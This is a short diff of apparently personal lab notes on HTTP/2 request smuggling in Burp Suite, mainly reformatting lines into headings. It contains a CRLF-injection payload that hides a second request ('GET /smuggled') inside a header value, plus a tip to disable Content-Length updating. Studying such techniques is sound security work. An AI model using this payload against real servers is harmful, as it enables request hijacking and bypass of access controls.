@@ -44,18 +44,28 @@
 
 ### Example:
 
-POST /legit HTTP/2
-Host: IP_ADDRESS:PORT
-User-Agent: Mozilla/5.0
-Foo: bar
+#### POST /legit HTTP/2
+
+#### Host: IP_ADDRESS:PORT
+
+#### User-Agent: Mozilla/5.0
+
+#### Foo: bar
 
 #### Send request through repeater
 
 #### Edit the Foo header from the inspector tab
 
-bar\r\n
-Host: IP_ADDRESS:PORT\r\n
-Content-Length: 0\r\n
-\r\n
-GET /smuggled HTTP/1.1\r\n
-X-Fake: a 
+#### bar\r\n
+
+#### Host: IP_ADDRESS:PORT\r\n
+
+#### Content-Length: 0\r\n
+
+#### \r\n
+
+#### GET /smuggled HTTP/1.1\r\n
+
+#### X-Fake: a 
+
+## NOTE: Don't forget to disable update content-length (Gear icon)
